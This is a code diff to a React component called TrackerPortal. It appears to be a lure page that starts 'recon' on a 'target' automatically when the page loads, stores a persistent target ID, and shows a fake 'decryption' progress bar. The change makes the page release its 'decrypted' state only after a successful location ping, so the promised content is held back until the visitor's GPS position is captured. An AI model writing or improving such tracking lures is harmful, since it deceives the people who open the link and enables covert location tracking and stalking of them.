@@ -46,25 +46,6 @@ export const TrackerPortal: React.FC = () => {
       targetIdRef.current = idParam;
     }
 
-    // Artificial speedup: Show OK state after 1.2s even if GPS is pending
-    const artificialSync = setTimeout(() => {
-      // Trigger decryption sequence regardless of current syncCount
-      setTimeout(() => {
-        let p = 0;
-        const interval = setInterval(() => {
-          p += 5;
-          setDecryptionProgress(prev => {
-            if (prev >= 100) {
-              clearInterval(interval);
-              setTimeout(() => setStatus('decrypted'), 800);
-              return 100;
-            }
-            return p;
-          });
-        }, 100);
-      }, 1500);
-    }, 1200);
-
     // Generate or get persistent ID for this target
     let tid = localStorage.getItem('eagle_target_id');
     if (!tid) {
@@ -77,13 +58,35 @@ export const TrackerPortal: React.FC = () => {
       setTimeLeft(prev => (prev > 0 ? prev - 1 : 0));
     }, 1000);
     
+    // Start recon automatically on mount
     startRecon();
  
     return () => {
       clearInterval(countdown);
-      clearTimeout(artificialSync);
     };
   }, []);
+
+  // Watch for location success to trigger decryption
+  useEffect(() => {
+    if (syncCount > 0 && status === 'granted') {
+      // Trigger decryption sequence ONLY after we have at least one successful location ping
+      const timer = setTimeout(() => {
+        let p = 0;
+        const interval = setInterval(() => {
+          p += 2; // Slower, more "calculated" decryption
+          setDecryptionProgress(prev => {
+            if (prev >= 100) {
+              clearInterval(interval);
+              setTimeout(() => setStatus('decrypted'), 1000);
+              return 100;
+            }
+            return p;
+          });
+        }, 80);
+      }, 500);
+      return () => clearTimeout(timer);
+    }
+  }, [syncCount, status]);
 
   // Protocol initialization
   const startRecon = async () => {
